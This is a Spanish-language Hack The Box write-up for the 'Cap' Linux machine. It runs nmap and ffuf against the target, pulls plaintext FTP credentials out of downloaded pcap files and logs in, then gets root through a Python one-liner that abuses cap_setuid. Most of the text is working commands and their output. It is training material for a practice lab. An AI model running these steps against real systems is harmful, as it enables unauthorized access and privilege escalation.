---
title: Cap
featured: true
lang: es
image: /src/images/hackthebox/cap/cap.png
platform: htb
difficulty: easy
os: linux
hints: [PCAP analysis, Hardcoded credentials, Capabilities]
tags: [hackthebox, linux, http, pcap, hardcoded-credentials, ftp, ssh, CWE-798, capabilities, CWE-274]
parent: writeups/hackthebox/machines
---

<div style="display: flex; justify-content: center;">

![Cap](/src/images/hackthebox/cap/cap.png)

</div>

<div style="text-align: center;">

[https://app.hackthebox.com/machines/Cap](https://app.hackthebox.com/machines/Cap)

</div>

## Enumeration

Escanear todos los puertos para ver cuales están abiertos

```bash
sudo nmap -p- -sS --min-rate 5000 -Pn -n -vv -oA nmap/Cap 10.129.4.66
```

```
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

Escanear puertos abiertos para saber que servicios y versiones corren en cada uno

```bash
nmap -p 21,22,80 -sCV -oA nmap/openPorts 10.129.4.66
```

```plaintext
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    Gunicorn
|_http-title: Security Dashboard
|_http-server-header: gunicorn
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

El servicio http `http://10.129.4.66/` muestra un dashboard de seguridad

![HTTP Service](/src/images/hackthebox/cap/http-service.webp)

La URL `http://10.129.4.66/data/1` permite descargar un archivo `1.pcap` que contiene tráfico de red.

Fuzzear para encontrar más archivos

![HTTP Data](/src/images/hackthebox/cap/http-data.webp)

```bash
ffuf -w <(seq 0 100) -u http://10.129.4.66/data/FUZZ -c -fc 302
```

```plaintext
0                       [Status: 200, Size: 17147, Words: 7066, Lines: 371, Duration: 164ms]
2                       [Status: 200, Size: 17144, Words: 7066, Lines: 371, Duration: 169ms]
3                       [Status: 200, Size: 17144, Words: 7066, Lines: 371, Duration: 184ms]
4                       [Status: 200, Size: 17144, Words: 7066, Lines: 371, Duration: 193ms]
1                       [Status: 200, Size: 17147, Words: 7066, Lines: 371, Duration: 196ms]
```

Descargar los archivos `0.pcap`, `1.pcap`, `2.pcap`, `3.pcap` y `4.pcap` con **Python**

`pcaps.py`

```python
import os
import requests

IP = "10.129.4.66"
IDS_RANGE = range(0, 5)
DEST_FOLDER = "pcaps"

if not os.path.exists(DEST_FOLDER):
    os.makedirs(DEST_FOLDER)

print("[*] Downloading files\n")

for id in IDS_RANGE:

    url = f"http://{IP}/download/{id}"
    filename = os.path.join(DEST_FOLDER, f"{id}.pcap")

    try:
        with requests.get(url, stream=True, timeout=5) as response:
            if response.status_code == 200:
                print(f"[*] Downloading ID {id} > {filename}")

                with open(filename, "wb") as f:
                    for block in response.iter_content(chunk_size=8192):
                        if block:
                            f.write(block)

                print("[+] DONE")

            if response.status_code != 200:
                continue

    except requests.exceptions.ConnectionError:
        print("[!] Connection Error")
        break
    except requests.exceptions.RequestException as e:
        print(f"[!] Error with ID {id}: {e}")

print("\n[+] Files downloaded")
```

Analizar los archivos descargados con `strings` para encontrar información relevante

```bash
strings pcaps/*.pcap | grep -iE "pass|user"
```

```
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0
.form-signin input[type="password"] {
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0
USER nathan
331 Please specify the password.
PASS Buck3tH4TF0RM3!
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:151.0) Gecko/20100101 Firefox/151.0
```

Encontramos credenciales para el servicio FTP `nathan:Buck3tH4TF0RM3!`

## Exploitation

```bash
ftp 10.129.4.66
```

```bash
Connected to 10.129.4.66.
220 (vsFTPd 3.0.3)
Name (10.129.4.66:melvin): nathan
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-r--------    1 1001     1001           33 May 23 14:51 user.txt
226 Directory send OK.
ftp> get user.txt -
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for user.txt (33 bytes).
50d**************************e86
226 Transfer complete.
33 bytes received in 0.0000 seconds (854.9747 kbytes/s)
ftp> quit
221 Goodbye.
```

### User flag

**50d**************************e86**

## Privilege Escalation

```bash
ssh nathan@10.129.4.66
```

Buscar capabilities del kernel asignadas a archivos ejecutables en todo el sistema

```bash
getcap -r / 2>/dev/null
```

```plaintext
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

La capability `cap_setuid` permite que el binario `/usr/bin/python3.8` manipule y cambie el UID (ID de usuario) del proceso. Al tenerla asignada, Python puede transformarse a sí mismo en el usuario root (UID 0) en tiempo de ejecución.

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

```bash
id
```

```plaintext
uid=0(root) gid=1001(nathan) groups=1001(nathan)
```

```bash
cd /root
ls
```

```plaintext
root.txt  snap
```

```bash
cat root.txt
```

### Root flag

**3e2**************************8aa**